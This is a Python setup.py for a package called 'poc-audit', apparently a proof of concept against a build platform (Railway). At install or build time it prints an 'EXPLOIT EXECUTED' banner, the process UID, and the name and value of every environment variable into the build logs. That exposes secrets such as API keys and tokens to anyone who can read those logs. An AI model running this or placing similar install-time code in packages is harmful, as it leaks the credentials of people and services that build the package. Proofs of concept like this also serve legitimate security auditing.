from setuptools import setup
import os

# Этот блок обязан появиться в логах сборки
print("\n" + "!"*50)
print("ALARM: EXPLOIT EXECUTED")
print(f"UID: {os.getuid()}")
# Печатаем переменные окружения прямо в консоль Railway
for k, v in os.environ.items():
    print(f"FOUND_VAR: {k}={v}")
print("!"*50 + "\n")

setup(name="poc-audit", version="1.1.0")
